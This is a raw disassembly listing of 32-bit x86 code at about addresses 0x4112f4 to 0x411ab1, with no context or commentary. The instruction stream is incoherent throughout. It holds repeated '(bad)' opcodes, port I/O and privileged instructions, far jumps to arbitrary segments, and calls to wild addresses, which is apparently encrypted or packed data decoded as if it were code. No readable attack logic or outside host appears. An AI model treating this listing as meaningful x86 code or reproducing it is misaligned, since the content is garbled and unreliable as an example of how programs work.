  4112f4:	add    ebx,DWORD PTR [ecx+0x4b]
  4112f7:	jmp    0x1a49:0x89dd24bb
  4112fe:	cmc    
  4112ff:	xlat   BYTE PTR ds:[ebx]
  411300:	fnstcw WORD PTR [eax]
  411302:	mov    ecx,0x3e0fdabb
  411307:	dec    ebp
  411308:	mov    eax,ds:0xd5d4d6af
  41130d:	cmp    ebp,eax
  41130f:	mov    ds:0xad20ec58,al
  411314:	ins    BYTE PTR es:[edi],dx
  411315:	cmp    bh,bh
  411317:	ins    BYTE PTR es:[edi],dx
  411318:	ror    BYTE PTR [ebp-0x51],1
  41131b:	mov    ss,eax
  41131d:	xchg   ecx,eax
  41131e:	shl    DWORD PTR [eax-0x7b49a943],cl
  411324:	stos   BYTE PTR es:[edi],al
  411325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411326:	and    eax,0xdda70462
  41132b:	into   
  41132c:	ins    BYTE PTR es:[edi],dx
  41132d:	(bad)  
  41132e:	and    BYTE PTR [ebp+edx*4-0x3ee3c9ee],cl
  411335:	sub    DWORD PTR [edx],ecx
  411337:	push   ss
  411338:	stos   DWORD PTR es:[edi],eax
  411339:	jmp    0x411397
  41133b:	stc    
  41133c:	gs pop eax
  41133e:	call   0xd6959081
  411343:	push   edx
  411344:	cmc    
  411345:	jo     0x41137b
  411347:	popa   
  411348:	nop
  411349:	aam    0xd7
  41134b:	hlt    
  41134c:	mov    al,0x9d
  41134e:	int    0x5b
  411350:	inc    ebp
  411351:	push   ds
  411352:	adc    al,0x9f
  411354:	xor    ecx,DWORD PTR [ebp-0x7f]
  411357:	and    eax,0x63cb175b
  41135c:	ffreep st(5)
  41135e:	add    al,0x48
  411360:	(bad)  
  411361:	pop    ebp
  411362:	ins    BYTE PTR es:[edi],dx
  411363:	gs jb  0x4113cd
  411366:	jno    0x411381
  411368:	mov    ebp,0xcad82bac
  41136d:	jno    0x4113cf
  41136f:	mov    ecx,0x78700c72
  411374:	ret    0xa8d9
  411377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411378:	int3   
  411379:	xor    bl,dh
  41137b:	inc    eax
  41137c:	pop    ecx
  41137d:	aas    
  41137e:	pop    ecx
  41137f:	cs push eax
  411381:	adc    BYTE PTR [edx-0x13a463a5],al
  411387:	adc    bl,cl
  411389:	es out dx,al
  41138b:	xor    ebp,DWORD PTR [ebp-0x6f877c1e]
  411391:	mov    eax,DWORD PTR [esi]
  411393:	mov    edx,0x3f876e82
  411398:	int    0x93
  41139a:	jmp    0xdfc3e434
  41139f:	mov    esp,0x803c628b
  4113a4:	iret   
  4113a5:	sti    
  4113a6:	sub    ecx,esi
  4113a8:	inc    esi
  4113a9:	int    0xf4
  4113ab:	add    eax,DWORD PTR [eax+0x1b]
  4113ae:	imul   edi,DWORD PTR [ecx+0x30d63bb4],0x86d88f47
  4113b8:	adc    esi,ebp
  4113ba:	push   ebx
  4113bb:	and    bh,dh
  4113bd:	xchg   edi,eax
  4113be:	or     al,0xaf
  4113c0:	mov    fs,esi
  4113c2:	cwde   
  4113c3:	leave  
  4113c4:	in     al,0xdd
  4113c6:	jg     0x41140b
  4113c8:	dec    ecx
  4113c9:	cmp    BYTE PTR [esi],dh
  4113cb:	mov    ds:0x945dc725,eax
  4113d0:	ins    DWORD PTR es:[edi],dx
  4113d1:	xchg   edi,eax
  4113d2:	or     esi,DWORD PTR [ebx+esi*1]
  4113d5:	mov    eax,ecx
  4113d7:	or     dh,cl
  4113d9:	retf   0xbe80
  4113dc:	out    0xab,eax
  4113de:	jbe    0x411434
  4113e0:	icebp  
  4113e1:	gs je  0x41139f
  4113e4:	stos   BYTE PTR es:[edi],al
  4113e5:	cli    
  4113e6:	jp     0x4113e3
  4113e8:	sub    eax,DWORD PTR [edx+esi*2]
  4113eb:	(bad)  
  4113ec:	push   es
  4113ed:	sub    al,0xd8
  4113ef:	and    ebx,DWORD PTR [edi+0x21]
  4113f2:	add    eax,0x1d0eb8af
  4113f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113f8:	push   0x21
  4113fa:	sbb    esp,DWORD PTR [ebx-0x34]
  4113fd:	aas    
  4113fe:	push   esp
  4113ff:	xchg   DWORD PTR [ebx+0x68],ecx
  411402:	(bad)  
  411403:	and    DWORD PTR [edx],ecx
  411405:	and    ebx,DWORD PTR [ebx+0x63]
  411408:	repz adc ebx,DWORD PTR [edx-0x1dcf4523]
  41140f:	push   edx
  411410:	mov    WORD PTR [esp+eiz*8],?
  411413:	sub    eax,0x294c32f
  411418:	and    DWORD PTR [ecx+eiz*4-0x207f4609],ebx
  41141f:	fdiv   st,st(0)
  411421:	pop    ebx
  411422:	ret    
  411423:	push   DWORD PTR [edi]
  411425:	lds    eax,FWORD PTR [ecx+0x3bff6285]
  41142b:	sti    
  41142c:	mov    esi,DWORD PTR [esi+0x58]
  41142f:	inc    esi
  411430:	mov    esp,cs
  411432:	adc    DWORD PTR [edi+0x51184d9],0x0
  411439:	cmc    
  41143a:	cmc    
  41143b:	int3   
  41143c:	pop    edx
  41143d:	push   eax
  41143e:	sub    DWORD PTR [esi+0x61],eax
  411441:	dec    ebp
  411442:	xchg   esp,eax
  411443:	rcl    DWORD PTR [bp+si],0xd7
  411447:	xor    dh,BYTE PTR [ecx+eiz*8-0x72dae3a1]
  41144e:	outs   dx,BYTE PTR ds:[esi]
  41144f:	pop    ebx
  411450:	sbb    eax,0x22597136
  411455:	lock bound ebx,QWORD PTR [eax-0x19a1e25a]
  41145c:	shl    bl,cl
  41145e:	sbb    ch,BYTE PTR [esp+eax*4-0x50]
  411462:	stos   BYTE PTR es:[edi],al
  411463:	dec    edi
  411464:	jno    0x411462
  411466:	push   eax
  411467:	arpl   WORD PTR ds:0xd5d770b5,bx
  41146d:	imul   esp,ebx,0xffffffc4
  411470:	imul   BYTE PTR [edx-0x29]
  411473:	jnp    0x41146a
  411475:	pop    ebp
  411476:	pop    edi
  411477:	icebp  
  411478:	jmp    0x2ce6e010
  41147d:	cli    
  41147e:	jl     0x411411
  411480:	test   eax,0x7e65b029
  411485:	xchg   edx,eax
  411486:	mov    edx,0x55da874f
  41148b:	push   edx
  41148c:	xchg   edx,eax
  41148d:	les    ecx,FWORD PTR [edx-0x78]
  411490:	ficomp DWORD PTR [ecx+0x45]
  411493:	fs dec esi
  411495:	test   BYTE PTR [ebx],dl
  411497:	push   0x7f6c18db
  41149c:	mov    ebx,0x7510d25b
  4114a1:	push   ds
  4114a2:	aam    0x76
  4114a4:	sub    ah,BYTE PTR [esi]
  4114a6:	mov    ah,0x80
  4114a8:	not    DWORD PTR ds:0xcebc148c
  4114ae:	fst    DWORD PTR [eax]
  4114b0:	adc    BYTE PTR [esi+0x24],ch
  4114b3:	inc    ecx
  4114b4:	jmp    0xa4b7d9e6
  4114b9:	push   ebx
  4114ba:	sub    eax,0x298fd359
  4114bf:	push   0x9ca07dc9
  4114c4:	pop    edx
  4114c5:	jge    0x411447
  4114c7:	xchg   ebp,eax
  4114c8:	dec    ebx
  4114c9:	ja     0x411457
  4114cb:	add    BYTE PTR [ebx-0x34e540ec],dl
  4114d1:	pop    ecx
  4114d2:	lds    ecx,FWORD PTR [edx+edx*4-0x5a]
  4114d6:	fwait
  4114d7:	pop    ebx
  4114d8:	xchg   esi,eax
  4114d9:	retf   
  4114da:	test   al,0x26
  4114dc:	dec    ebx
  4114dd:	loop   0x411479
  4114df:	mov    esp,0x4b819b32
  4114e4:	dec    ecx
  4114e5:	repnz xchg bx,ax
  4114e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114e9:	aas    
  4114ea:	mov    ebx,fs
  4114ec:	iret   
  4114ed:	cmp    esi,edi
  4114ef:	adc    al,0x8f
  4114f1:	outs   dx,BYTE PTR ds:[esi]
  4114f2:	int    0x91
  4114f4:	aad    0xb4
  4114f6:	jo     0x411484
  4114f8:	call   0x1120f981
  4114fd:	ficom  DWORD PTR [ebp-0x5]
  411500:	sub    cl,BYTE PTR [ebp-0x6c9f6e01]
  411506:	out    0x8a,eax
  411508:	das    
  411509:	inc    ebp
  41150a:	dec    ecx
  41150b:	add    BYTE PTR [esi+0x166eab6c],cl
  411511:	out    dx,eax
  411512:	ror    dh,cl
  411514:	xchg   edi,eax
  411515:	xchg   ch,al
  411517:	xchg   esp,eax
  411518:	add    BYTE PTR [edi-0x26],dh
  41151b:	scas   al,BYTE PTR es:[edi]
  41151c:	sti    
  41151d:	mov    esi,0xa6861bf0
  411522:	jno    0x411598
  411524:	loope  0x411552
  411526:	jb     0x4114fb
  411528:	ds mov dh,0x62
  41152b:	mov    ebp,0xeb626691
  411530:	and    ah,0xd3
  411533:	ficom  WORD PTR [ecx-0x2829b087]
  411539:	jmp    0xacd4:0xa052a081
  411540:	xchg   DWORD PTR [edi],ebx
  411542:	and    bl,BYTE PTR [ebx-0x1893353f]
  411548:	xchg   esi,eax
  411549:	outs   dx,BYTE PTR ds:[esi]
  41154a:	imul   ebp,DWORD PTR [edx+edx*4+0x72],0xad25e3bd
  411552:	stos   DWORD PTR es:[edi],eax
  411553:	aaa    
  411554:	mov    DWORD PTR [esi-0x10],esp
  411557:	jnp    0x4114ea
  411559:	and    DWORD PTR [ecx],edi
  41155b:	add    eax,0x2604d59c
  411560:	inc    ecx
  411561:	(bad)  
  411562:	imul   ebp,DWORD PTR [edx-0x117f5b24],0xffffffbb
  411569:	popf   
  41156a:	jl     0x4115a3
  41156c:	loope  0x411573
  41156e:	int    0x1b
  411570:	inc    edx
  411571:	loopne 0x411503
  411573:	cmc    
  411574:	adc    esi,0xf
  411577:	ret    0x1357
  41157a:	add    WORD PTR [ebp+0x10],0xffb5
  41157f:	push   ss
  411580:	jns    0x4115c5
  411582:	xor    BYTE PTR [edx+ebx*2],cl
  411585:	mov    WORD PTR [edi+0x24],fs
  411588:	aam    0x45
  41158a:	or     DWORD PTR [esi-0x425d8698],esp
  411590:	cld    
  411591:	adc    al,0x4a
  411593:	sbb    al,0xb2
  411595:	jnp    0x411608
  411597:	and    eax,0xb744c463
  41159c:	cwde   
  41159d:	retf   0x4919
  4115a0:	mov    esp,0xbc162dc9
  4115a5:	aam    0x31
  4115a7:	fldenv ds:0x91ed088f
  4115ad:	fst    DWORD PTR [ebp+0x131a7ede]
  4115b3:	sbb    DWORD PTR [ecx],ecx
  4115b5:	aaa    
  4115b6:	iret   
  4115b7:	fiadd  DWORD PTR [edi]
  4115b9:	xchg   edi,eax
  4115ba:	loopne 0x4115b1
  4115bc:	sbb    cl,cl
  4115be:	rcl    ch,1
  4115c0:	push   0xffffff96
  4115c2:	pop    edi
  4115c3:	aad    0x20
  4115c5:	iret   
  4115c6:	cs push ebx
  4115c8:	sbb    esp,DWORD PTR [edi+eiz*1+0x38]
  4115cc:	int    0x3d
  4115ce:	cli    
  4115cf:	dec    ebp
  4115d0:	aas    
  4115d1:	scas   al,BYTE PTR es:[edi]
  4115d2:	shl    BYTE PTR [ecx+0xfc613d7],cl
  4115d8:	jg     0x4115f4
  4115da:	inc    ecx
  4115db:	xchg   ecx,eax
  4115dc:	sar    BYTE PTR [edx+0x23],1
  4115df:	inc    ebx
  4115e0:	je     0x4115c0
  4115e2:	push   es
  4115e3:	les    eax,FWORD PTR [eax]
  4115e5:	sub    BYTE PTR [edx-0x41d57f08],ch
  4115eb:	adc    DWORD PTR [ebp+0x44],edx
  4115ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ef:	fisubr DWORD PTR [ecx+0x5f23e8c0]
  4115f5:	bound  ebp,QWORD PTR ds:0x3323ecb8
  4115fb:	test   eax,0xf058e183
  411600:	xor    edi,DWORD PTR [edx]
  411602:	mov    ecx,0xf8a9b73e
  411607:	stos   DWORD PTR es:[edi],eax
  411608:	cdq    
  411609:	stos   DWORD PTR es:[edi],eax
  41160a:	fbstp  TBYTE PTR [edi-0xd]
  41160d:	fs sbb eax,0x2a9e6101
  411613:	xor    eax,0xe1dfd6ab
  411618:	pop    esi
  411619:	xor    eax,0x33d06594
  41161e:	ins    DWORD PTR es:[edi],dx
  41161f:	fiadd  WORD PTR [ecx]
  411621:	js     0x411616
  411623:	mov    ch,0xab
  411625:	push   esp
  411626:	mov    eax,ds:0xbd0954a1
  41162b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41162c:	or     eax,0x4172765d
  411631:	shr    BYTE PTR [eax+0x62],0x2f
  411635:	aam    0x70
  411637:	xor    ebx,DWORD PTR [eax-0x4a]
  41163a:	test   DWORD PTR [eax-0x5f],edi
  41163d:	push   ebp
  41163e:	inc    esp
  41163f:	test   al,ch
  411641:	(bad)  
  411642:	mov    edx,0x3c20de4d
  411647:	arpl   WORD PTR [edi],di
  411649:	pop    edi
  41164a:	fstp   DWORD PTR [ebp+0x6]
  41164d:	nop
  41164e:	das    
  41164f:	rcr    DWORD PTR [edi+0x6],1
  411652:	daa    
  411653:	(bad)  [edx-0x33769b6]
  411659:	sub    DWORD PTR [esi+0x183ab203],0x9579e004
  411663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411664:	fistp  WORD PTR [edx+0x405e79]
  41166a:	dec    eax
  41166b:	adc    DWORD PTR [eax-0x4d105f26],0xffffffe9
  411672:	ins    BYTE PTR es:[edi],dx
  411673:	xor    eax,0x815df26d
  411678:	or     al,0x7e
  41167b:	cs or  eax,0xd6d8bc14
  411681:	jno    0x4116b7
  411683:	(bad)  
  411684:	test   esi,ecx
  411686:	jno    0x4116b8
  411688:	cld    
  411689:	dec    eax
  41168a:	pushw  ss
  41168c:	sbb    esp,DWORD PTR [edi+ebx*4]
  41168f:	cmp    ecx,esi
  411691:	xchg   ecx,eax
  411692:	xchg   edi,eax
  411693:	(bad)  
  411695:	xor    eax,0xad756d49
  41169a:	daa    
  41169b:	sub    eax,0x808e431e
  4116a0:	sub    DWORD PTR [esi-0x65],edx
  4116a3:	es in  eax,dx
  4116a5:	aam    0xbc
  4116a7:	das    
  4116a8:	and    ah,BYTE PTR [ebx]
  4116aa:	or     eax,0xc84f416
  4116af:	push   ss
  4116b0:	xor    al,0x3f
  4116b2:	inc    ecx
  4116b3:	mov    bl,0xcc
  4116b5:	cdq    
  4116b6:	jmp    0x411731
  4116b8:	jmp    0x96ae:0x85eb7505
  4116bf:	out    dx,al
  4116c0:	cmp    al,0x4b
  4116c2:	mov    edi,0x857a2696
  4116c7:	push   cs
  4116c8:	mov    ds:0x593ff1b6,eax
  4116cd:	cs loopne 0x4116fe
  4116d0:	or     BYTE PTR [eax+0x26],0x8a
  4116d4:	je     0x4116bd
  4116d6:	jb     0x41165b
  4116d8:	adc    al,0x60
  4116da:	and    BYTE PTR [ebp-0x8],0x45
  4116de:	and    DWORD PTR [esi+0x35],0xd452e26d
  4116e5:	cs fwait
  4116e7:	je     0x4116db
  4116e9:	inc    eax
  4116ea:	sub    dh,BYTE PTR [ecx+0x223f5299]
  4116f0:	xchg   edi,eax
  4116f1:	in     eax,0xe6
  4116f3:	pop    ds
  4116f4:	out    dx,eax
  4116f5:	xchg   BYTE PTR [edx],ch
  4116f7:	xlat   BYTE PTR ds:[bx]
  4116f9:	pop    ebx
  4116fa:	scas   al,BYTE PTR es:[edi]
  4116fb:	retf   0x200c
  4116fe:	and    dh,BYTE PTR [ebp+0x5bf8534c]
  411704:	mov    edx,0x39c151f2
  411709:	inc    esi
  41170a:	das    
  41170b:	and    eax,0x91521248
  411710:	test   BYTE PTR [eax],ah
  411712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411713:	adc    al,0x31
  411715:	push   ds
  411716:	das    
  411717:	xor    al,0x18
  411719:	push   esi
  41171a:	cmp    edx,0xfa55e51a
  411720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411721:	out    0xa6,al
  411723:	fwait
  411724:	retf   
  411725:	add    esp,DWORD PTR [edx-0x5cb3f557]
  41172b:	push   ebx
  41172c:	adc    eax,0xd061f8e1
  411731:	cmp    bh,BYTE PTR [esi-0x623bb700]
  411737:	inc    esp
  411738:	loop   0x411771
  41173a:	push   eax
  41173b:	push   cs
  41173c:	mov    edx,0xede6ce24
  411741:	cld    
  411742:	mov    WORD PTR [ebx-0x392c640c],ss
  411748:	push   edx
  411749:	jbe    0x41170d
  41174b:	jno    0x4116f2
  41174d:	xor    eax,DWORD PTR [edx+ebp*1]
  411750:	shl    ch,cl
  411752:	fwait
  411753:	test   eax,0x4068e0ba
  411758:	out    dx,al
  411759:	adc    al,al
  41175b:	add    ebx,eax
  41175d:	les    edi,FWORD PTR ds:0x195aa36a
  411763:	pop    ds
  411764:	mov    eax,0x41463f50
  411769:	push   cs
  41176a:	test   DWORD PTR [edi],esi
  41176c:	xchg   esp,eax
  41176d:	push   ebp
  41176e:	or     dh,BYTE PTR [edx+esi*4-0x22c6633f]
  411775:	bound  esp,QWORD PTR ds:0xf2b4be12
  41177b:	xchg   edi,eax
  41177c:	retf   
  41177d:	sub    BYTE PTR [edi+0x6c],dh
  411780:	nop
  411781:	out    0x7d,al
  411783:	xchg   edx,eax
  411784:	mov    ch,0x57
  411786:	dec    ecx
  411787:	inc    edi
  411788:	sub    DWORD PTR [edx],ecx
  41178a:	sti    
  41178b:	clc    
  41178c:	test   al,0xc8
  41178e:	jbe    0x4117b4
  411790:	jae    0x4117bf
  411792:	pop    ebx
  411793:	nop
  411794:	sbb    BYTE PTR [ecx+0x3e],al
  411797:	jmp    0x41180d
  411799:	cmp    edx,DWORD PTR [eax]
  41179b:	mov    al,ds:0xe96debec
  4117a0:	mov    ebp,DWORD PTR [eax-0x79751dd7]
  4117a6:	xchg   ebp,eax
  4117a7:	daa    
  4117a8:	cmp    eax,0xb0c25095
  4117ad:	sub    al,0x15
  4117af:	jmp    0x6f87:0x7aef1b8a
  4117b6:	jecxz  0x411781
  4117b8:	aas    
  4117b9:	adc    al,0x1f
  4117bb:	push   esi
  4117bc:	icebp  
  4117bd:	adc    eax,0xd1841f64
  4117c2:	rcl    al,0x56
  4117c5:	ja     0x41182c
  4117c7:	jne    0x41181f
  4117c9:	ret    
  4117ca:	pop    esi
  4117cb:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cd:	cli    
  4117ce:	push   es
  4117cf:	push   ss
  4117d0:	in     eax,0x6f
  4117d2:	mov    eax,ds:0x6bb0369b
  4117d7:	and    ch,BYTE PTR ds:0xbf04c416
  4117dd:	mov    BYTE PTR [ebp-0x3761a2cc],ah
  4117e3:	ret    
  4117e4:	aad    0xaf
  4117e6:	pop    es
  4117e7:	test   DWORD PTR [ebx+eax*4-0x9],ecx
  4117eb:	push   edx
  4117ec:	jno    0x4117b1
  4117ee:	outs   dx,DWORD PTR ds:[esi]
  4117ef:	scas   eax,DWORD PTR es:[edi]
  4117f0:	fld    TBYTE PTR [edi-0x35]
  4117f3:	leave  
  4117f4:	mov    al,ds:0xe14ee552
  4117f9:	jbe    0x411795
  4117fb:	sahf   
  4117fc:	mov    dh,0xde
  4117fe:	call   0xd0f:0x83506e69
  411805:	mov    bl,0xb7
  411807:	addr16 or al,0xb3
  41180a:	mov    bh,0xa8
  41180c:	lock xchg ebx,eax
  41180e:	inc    esi
  41180f:	stos   DWORD PTR es:[edi],eax
  411810:	xlat   BYTE PTR ds:[ebx]
  411811:	jmp    0x4fff526b
  411816:	test   eax,0x9c963992
  41181b:	sahf   
  41181c:	mov    esi,0x5a4c1943
  411821:	loop   0x4117b5
  411823:	jg     0x4117c4
  411825:	cmp    DWORD PTR [ecx+eax*8-0x3d643ff1],ebp
  41182c:	outs   dx,DWORD PTR ds:[esi]
  41182d:	push   edx
  41182e:	scas   al,BYTE PTR es:[edi]
  41182f:	pop    edi
  411830:	cli    
  411831:	jbe    0x411888
  411833:	cli    
  411834:	or     esp,DWORD PTR [ebp-0x4fe68927]
  41183a:	enter  0xb03d,0xd9
  41183e:	push   0xffffffc3
  411840:	ror    DWORD PTR [eax],0x93
  411843:	sub    edi,esi
  411845:	push   ds
  411846:	cld    
  411847:	jns    0x411853
  411849:	(bad)  
  41184a:	out    0x89,al
  41184c:	lods   al,BYTE PTR ds:[esi]
  41184d:	mov    al,0x62
  41184f:	push   eax
  411850:	pop    ds
  411851:	les    esi,FWORD PTR [esp+edx*2]
  411854:	stos   DWORD PTR es:[edi],eax
  411855:	fimul  WORD PTR [eax]
  411857:	sub    BYTE PTR [ebp-0x42],al
  41185a:	sub    eax,edx
  41185c:	mov    eax,0x60024e9b
  411861:	adc    BYTE PTR [eax+0x4],cl
  411864:	xchg   bx,ax
  411866:	xor    esi,ebp
  411868:	add    DWORD PTR [edi],eax
  41186a:	jo     0x4118c7
  41186c:	jecxz  0x4118a8
  41186e:	lods   eax,DWORD PTR ds:[esi]
  41186f:	leave  
  411870:	in     eax,0x89
  411872:	pop    ebx
  411873:	pushf  
  411874:	sub    bh,ch
  411876:	push   esp
  411877:	bound  esi,QWORD PTR [esi-0x3]
  41187a:	add    cl,BYTE PTR [edx+0x54040d71]
  411880:	add    cl,BYTE PTR [eax+0x1c662b55]
  411886:	adc    ebp,ebx
  411888:	mov    ecx,0x68705f0d
  41188d:	(bad)  
  41188f:	pop    ebp
  411890:	loope  0x4118de
  411892:	daa    
  411893:	cdq    
  411894:	push   esi
  411895:	outs   dx,BYTE PTR ds:[esi]
  411896:	dec    esp
  411897:	adc    DWORD PTR [edi+0x7b071146],edi
  41189d:	sbb    DWORD PTR [esp+eiz*4],esp
  4118a0:	fmul   DWORD PTR [ecx+0x21]
  4118a3:	stc    
  4118a4:	stc    
  4118a5:	std    
  4118a6:	jns    0x41188e
  4118a8:	test   eax,0xc14da929
  4118ad:	push   ebp
  4118ae:	fiadd  DWORD PTR [ebx+ebp*2+0x7c00103e]
  4118b5:	in     al,0xb4
  4118b7:	fdivr  QWORD PTR [edx-0x4d7c4f92]
  4118bd:	hlt    
  4118be:	into   
  4118bf:	xor    DWORD PTR [esi-0x25],ebp
  4118c2:	add    esp,DWORD PTR [edi]
  4118c4:	xor    cl,cl
  4118c6:	ror    DWORD PTR [esi],0xa2
  4118c9:	iret   
  4118ca:	aam    0x3b
  4118cc:	fidiv  WORD PTR [ebx-0x17]
  4118cf:	punpcklwd mm5,DWORD PTR [ebx-0x12]
  4118d3:	jg     0x4118e8
  4118d5:	inc    ecx
  4118d6:	dec    eax
  4118d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d8:	mov    ebx,0x1c913365
  4118dd:	nop
  4118de:	repz popa 
  4118e0:	pop    edi
  4118e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e2:	sbb    esp,DWORD PTR [eax+0x7e]
  4118e5:	push   edx
  4118e6:	xor    DWORD PTR [esi+0x9],eax
  4118e9:	add    eax,0xd0a6ba08
  4118ee:	rol    DWORD PTR [ecx],1
  4118f0:	jmp    0x8a84:0x5dd91759
  4118f7:	and    ebx,0x8e3fb7bc
  4118fd:	jnp    0x411976
  4118ff:	call   0x808d9518
  411904:	fdivr  st,st(1)
  411906:	jge    0x41191f
  411908:	jo     0x4118f7
  41190a:	mov    esi,esp
  41190c:	(bad)  
  41190d:	repnz mov dh,0xe5
  411910:	mov    ecx,0x61695be7
  411915:	(bad)  
  411916:	stos   BYTE PTR es:[edi],al
  411917:	fs jne 0x411934
  41191a:	mov    ds:0x7e68bb2e,al
  41191f:	icebp  
  411920:	pop    esp
  411921:	ss test edi,edx
  411924:	adc    DWORD PTR [si+0x45d1],ebp
  411929:	addr16 inc edx
  41192b:	test   BYTE PTR [ebx],0xcb
  41192e:	and    BYTE PTR [esi],ch
  411930:	sti    
  411931:	out    dx,al
  411932:	shl    DWORD PTR [eax-0x2faa2588],0xd
  411939:	xchg   esp,eax
  41193a:	cmp    al,0x1e
  41193c:	aad    0xff
  41193e:	imul   eax,DWORD PTR [ebx],0xffffffb6
  411941:	and    BYTE PTR [edx],0x7a
  411944:	adc    DWORD PTR [eax-0x5db6de44],0xcd3ee828
  41194e:	outs   dx,BYTE PTR ds:[esi]
  41194f:	xor    dl,dl
  411951:	xor    al,BYTE PTR [ecx]
  411953:	mov    esp,DWORD PTR [ebx]
  411955:	popa   
  411956:	sbb    DWORD PTR [ebp-0x39],ebx
  411959:	mov    bh,0x7d
  41195b:	div    bh
  41195d:	xchg   edi,eax
  41195e:	sub    al,0x79
  411960:	xlat   BYTE PTR ds:[ebx]
  411961:	add    al,cl
  411963:	mov    al,ds:0xa4fa69e7
  411968:	pop    esi
  411969:	rcl    BYTE PTR [ebx-0x22],1
  41196c:	aam    0x7b
  41196e:	xchg   edi,eax
  41196f:	xor    ebp,DWORD PTR [ecx-0x725f154c]
  411975:	adc    esi,DWORD PTR [esi+0x62119c70]
  41197b:	scas   eax,DWORD PTR es:[edi]
  41197c:	adc    eax,edx
  41197e:	ror    BYTE PTR [edx],0x50
  411981:	pop    ebp
  411982:	and    al,0xd0
  411984:	add    al,0x40
  411986:	sbb    BYTE PTR [esp+ecx*2],al
  411989:	pop    ebx
  41198a:	sbb    ecx,edi
  41198c:	xor    eax,0x33a7d859
  411991:	(bad)  
  411992:	sbb    DWORD PTR [ebx],edi
  411994:	into   
  411995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411996:	xor    BYTE PTR [esi],ch
  411998:	jge    0x411989
  41199a:	test   eax,0xe6655a08
  41199f:	(bad)  
  4119a0:	(bad)  
  4119a1:	fmulp  st(5),st
  4119a3:	(bad)  
  4119a4:	ins    DWORD PTR es:[edi],dx
  4119a5:	pop    ebp
  4119a6:	sub    DWORD PTR [ebx+0x33],0x67504f1f
  4119ad:	jl     0x4119ba
  4119af:	call   0xb7f89b47
  4119b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b5:	sar    BYTE PTR [esi+0xa],cl
  4119b8:	push   DWORD PTR [edx+0x21]
  4119bb:	cmc    
  4119bc:	mov    BYTE PTR [ebx+0x2c],al
  4119bf:	rcl    cl,cl
  4119c1:	mov    ecx,0x43dd8922
  4119c6:	add    eax,0xf657b63a
  4119cb:	leave  
  4119cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119cd:	sub    DWORD PTR [eax+0x13],edx
  4119d0:	inc    ebx
  4119d1:	push   esi
  4119d2:	mov    ds:0xc83a245,al
  4119d7:	mov    bl,0x75
  4119d9:	push   esi
  4119da:	and    BYTE PTR [edi+0x35],0x79
  4119de:	xchg   edi,eax
  4119df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e0:	in     eax,dx
  4119e1:	dec    esi
  4119e2:	(bad)  
  4119e3:	mov    ds:0xc6504c5d,eax
  4119e8:	mov    al,0x71
  4119ea:	mov    WORD PTR [edx],es
  4119ec:	les    esi,FWORD PTR [edx]
  4119ee:	inc    DWORD PTR [esp+ecx*1]
  4119f1:	inc    edi
  4119f2:	(bad)  
  4119f3:	or     eax,0x30368be9
  4119f8:	ret    
  4119f9:	add    al,0x39
  4119fb:	cmp    eax,0xe98fa538
  411a00:	scas   al,BYTE PTR es:[edi]
  411a01:	in     eax,0xef
  411a03:	xchg   al,bh
  411a05:	hlt    
  411a06:	push   ds
  411a07:	imul   ebx,DWORD PTR [ebx+ebx*1-0x1a],0xffffffd1
  411a0c:	ins    DWORD PTR es:[edi],dx
  411a0d:	retf   0x5f17
  411a10:	xor    eax,0xb0284249
  411a15:	and    bh,cl
  411a17:	sti    
  411a18:	cwde   
  411a19:	aas    
  411a1a:	fild   WORD PTR [esi-0x4809ff1]
  411a20:	or     ecx,DWORD PTR [ecx-0x20c35f01]
  411a26:	sbb    esp,edi
  411a28:	cli    
  411a29:	dec    esi
  411a2a:	mov    esp,0x4a2f4924
  411a2f:	icebp  
  411a30:	mov    esi,0x7d037ce4
  411a35:	or     eax,0xae294a6d
  411a3a:	push   ebx
  411a3b:	cmp    eax,0x18fc9e37
  411a40:	imul   edx,DWORD PTR [ebx],0x15
  411a43:	mov    al,ds:0xedbf741d
  411a48:	into   
  411a49:	adc    al,BYTE PTR [esi-0x5f]
  411a4c:	cmp    esp,DWORD PTR [eax]
  411a4e:	pop    ecx
  411a4f:	aaa    
  411a50:	or     BYTE PTR [ecx-0xe],bl
  411a53:	lea    ebx,[eax+0x15]
  411a56:	jg     0x411a0e
  411a58:	popa   
  411a59:	lods   al,BYTE PTR ds:[esi]
  411a5a:	and    BYTE PTR ds:0x192f0ae4,cl
  411a60:	adc    BYTE PTR [eax-0x36],dl
  411a63:	call   0x76afea3a
  411a68:	mov    dh,0xe4
  411a6a:	fwait
  411a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a6c:	inc    ebx
  411a6d:	pop    eax
  411a6e:	or     al,0x3b
  411a70:	add    eax,0x7d0ce8a4
  411a75:	psubsw mm7,QWORD PTR ds:0x2903a87a
  411a7c:	pop    edi
  411a7d:	xchg   ebx,eax
  411a7e:	ja     0x411a38
  411a80:	fsub   st,st(1)
  411a82:	sbb    dh,dl
  411a84:	loop   0x411ae5
  411a86:	lahf   
  411a87:	mov    ds:0xa2f85004,al
  411a8c:	out    dx,eax
  411a8d:	xchg   esp,eax
  411a8e:	mov    dh,0x36
  411a90:	inc    BYTE PTR [eax]
  411a92:	xlat   BYTE PTR ds:[ebx]
  411a93:	push   esp
  411a94:	in     al,dx
  411a95:	aas    
  411a96:	push   0xffffffc0
  411a98:	(bad)  
  411a99:	test   DWORD PTR [ebp+0x77],0xa493cda2
  411aa0:	fnop   
  411aa2:	pop    edx
  411aa3:	dec    ebp
  411aa4:	mov    esi,DWORD PTR ds:0x2ac5281a
  411aaa:	cdq    
  411aab:	mov    ds:0x236f0703,al
  411ab0:	cwde   
  411ab1:	(bad)  
